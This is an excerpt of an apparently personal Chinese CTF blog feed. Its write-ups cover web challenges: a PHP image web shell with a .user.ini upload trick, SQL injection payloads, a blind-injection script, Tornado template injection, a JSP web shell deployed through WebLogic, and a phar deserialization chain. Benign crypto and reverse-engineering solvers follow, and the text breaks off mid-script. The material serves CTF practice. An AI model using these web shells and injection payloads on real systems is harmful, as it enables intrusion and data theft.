    <title>20211017</title>
    <link href="http://blog.haorical.top/posts/cd46c142/"/>
    <id>http://blog.haorical.top/posts/cd46c142/</id>
    <published>2021-10-17T13:31:05.000Z</published>
    <updated>2022-01-01T08:38:41.743Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p><p>先上传user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure><p>然后上传图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问路径下的index.php，让它自动加载马</p><p>蚁剑或者直接cat flag</p><p>一会儿在本地测试一下</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5的一些基操</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&quot;ffifdyop&quot;</span>,<span class="literal">true</span>)的值为</span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>xxxxxx</span><br><span class="line">可与sql结合用来构造永真式</span><br><span class="line">select * <span class="keyword">from</span> <span class="number">1</span> where <span class="number">2</span>=<span class="string">&#x27;md5(&quot;ffifdyop&quot;,true)&#x27;</span></span><br><span class="line"></span><br><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span> 绕过 == ===</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>e绕过==</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-CheckIn&quot;&gt;&lt;a href=&quot;#SUCTF-2019-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]CheckIn&quot;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h2&gt;&lt;p&gt;buu这</summary>
      
    
    
    
    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
    <category term="文件上传" scheme="http://blog.haorical.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>20211015</title>
    <link href="http://blog.haorical.top/posts/2348a06e/"/>
    <id>http://blog.haorical.top/posts/2348a06e/</id>
    <published>2021-10-15T15:27:55.403Z</published>
    <updated>2021-10-15T15:32:07.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote><p>模板注入</p></blockquote><p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p><p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p><p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p><p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings</p><p>可以获得一些设置</p><p>然后成功获得cookie_secret，md5获得hash值即可</p><p>在msg页面可以实现模板注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;护网杯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#护网杯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[护网杯 2018]easy_tornado&quot;&gt;&lt;/a&gt;[护网杯 2018]easy_tornado</summary>
      
    
    
    
    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>国庆赛部分赛题复现</title>
    <link href="http://blog.haorical.top/posts/bfdb9200/"/>
    <id>http://blog.haorical.top/posts/bfdb9200/</id>
    <published>2021-10-13T11:05:32.000Z</published>
    <updated>2021-10-13T13:59:32.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote><p>环境有点问题，复现一半出不来了</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p><p>先通过任意文件读取漏洞获得密钥和密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure><p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p><p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p><p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p><p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p><p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;sql2&quot;&gt;&lt;a href=&quot;#sql2&quot; class=&quot;headerlink&quot; title=&quot;sql2&quot;&gt;&lt;/a&gt;sql</summary>
      
    
    
    
    <category term="ctf学习" scheme="http://blog.haorical.top/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
    <category term="sql注入" scheme="http://blog.haorical.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2021秋季赛部分wp</title>
    <link href="http://blog.haorical.top/posts/31200392/"/>
    <id>http://blog.haorical.top/posts/31200392/</id>
    <published>2021-10-11T15:41:41.000Z</published>
    <updated>2021-10-11T15:56:40.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>震惊！平平无奇的web手，竟然把crypto ak了，顺带做了2个re和几个misc。。。</p><p>校赛感觉难度一般，就是给入门的做了，暑假学的好多都用上了，感觉不错。不过持续时间太长了，直接7天，而且国庆那几天贼忙，部门、工作室、新生······时间不是很合理，最后几天直接摆烂了，一个题也没做。</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>无列名注入，和寒假赛的类似</p></blockquote><p>库名还是cumtctf</p><p>爆表名得到flag_table_1</p><p>无列名注入得到flag，需要变成小写</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.69.241.44:25500/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,_!@#$%^&amp;*()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(1,1000):</span></span><br><span class="line"><span class="string">    for j in s:</span></span><br><span class="line"><span class="string">        time.sleep(0.1)</span></span><br><span class="line"><span class="string">        payload = &quot;1&#x27;/**/||/**/!(ascii(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),&#123;&#125;,1))&lt;&gt;ascii(&#x27;&#123;&#125;&#x27;))#&quot;.format(i, j)</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            &#x27;username&#x27;: payload,</span></span><br><span class="line"><span class="string">            &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">        if res.find(&#x27;good&#x27;) != -1:</span></span><br><span class="line"><span class="string">            table += j</span></span><br><span class="line"><span class="string">            print(table)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;1&#x27;/**/||/**/!(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),1,34)&lt;&gt;&#x27;address,email,flag_table_1,users&#x27;)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload2,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload3 = &quot;1&#x27;/**/||/**/(1,1)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload3,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>): </span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="comment"># for j in s:</span></span><br><span class="line">        hexchar = trans(flag+ <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;||/**/if((select/**/(0,&#123;&#125;)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)),1,0)#&quot;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;good&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># flag += j</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><blockquote><p>phar反序列化</p></blockquote><p>先通过任意文件读取获得class file fun class这些php文件，代码审计</p><p>构造pop链，生成phar文件</p><p>看到已经有其他队伍把这题做出来了，此时先测试看看能不能连上别的队伍上传成功的文件，根据file.php中对文件名的处理，随便测试了几个，发现phar.jpg处理后的文件路径能用，获得flag</p><p>下面贴上自己写的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$File</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$docker</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$cloud</span> = <span class="keyword">new</span> Cloud();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cloud</span>-&gt;docker = <span class="string">&#x27;O\:6\:\&quot;Docker\&quot;\:3\:\&#123;s\:3\:\&quot;str\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container1\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container2\&quot;\;s\:4\:\&quot;haha\&quot;\;\&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$File</span>-&gt;file = <span class="variable">$docker</span>;</span><br><span class="line"><span class="variable">$docker</span>-&gt;str = <span class="variable">$cloud</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$File</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>直接拖到ida里，得到flag</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E6%88%AA%E5%9B%BE20211003125756.png"></p><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>拖到ILSpy里，获得逆向代码</p><p>简单写个脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppp</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    a %= c</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            num = num * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % c      </span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">array2 = [</span><br><span class="line">            <span class="number">30361</span>,</span><br><span class="line"><span class="number">550</span>,</span><br><span class="line"><span class="number">595</span>,</span><br><span class="line"><span class="number">15412</span>,</span><br><span class="line"><span class="number">30361</span>,</span><br><span class="line"><span class="number">15412</span>,</span><br><span class="line"><span class="number">8346</span>,</span><br><span class="line"><span class="number">27071</span>,</span><br><span class="line"><span class="number">37594</span>,</span><br><span class="line"><span class="number">37534</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">1082</span>,</span><br><span class="line"><span class="number">19619</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">1082</span>,</span><br><span class="line"><span class="number">15513</span>,</span><br><span class="line"><span class="number">29591</span>,</span><br><span class="line"><span class="number">19596</span>,</span><br><span class="line"><span class="number">30078</span>,</span><br><span class="line"><span class="number">27942</span>,</span><br><span class="line"><span class="number">25366</span>,</span><br><span class="line"><span class="number">29107</span>,</span><br><span class="line"><span class="number">7433</span>,</span><br><span class="line"><span class="number">28493</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">29591</span>,</span><br><span class="line"><span class="number">2664</span>,</span><br><span class="line"><span class="number">12540</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array2)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">if</span> array2[j] == ppp(i, <span class="number">377</span>, <span class="number">38009</span>):</span><br><span class="line">            test.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">        print(<span class="built_in">chr</span>(j-i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>跑出flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><p>简单写个脚本爆破</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = <span class="number">37</span></span><br><span class="line">b = <span class="number">23</span></span><br><span class="line">c = <span class="number">52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def affine(m,a,b,c):</span></span><br><span class="line"><span class="string">    chipher=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(len(m)):</span></span><br><span class="line"><span class="string">        if m[i] in table:</span></span><br><span class="line"><span class="string">            chipher+=table[(a*(table.find(m[i]))+b)%c]</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            chipher+=m[i]</span></span><br><span class="line"><span class="string">    return chipher</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;aoxL&#123;Fw0_TXk_y3xtW_ZP_TCBg7VLCxGwb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">if</span> t[i] <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> table[(a*(table.find(j))+b)%c] == t[i]:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += t[i]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="lcg"><a href="#lcg" class="headerlink" title="lcg"></a>lcg</h3><p>从网上找个个脚本，写的很详细</p><p><a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 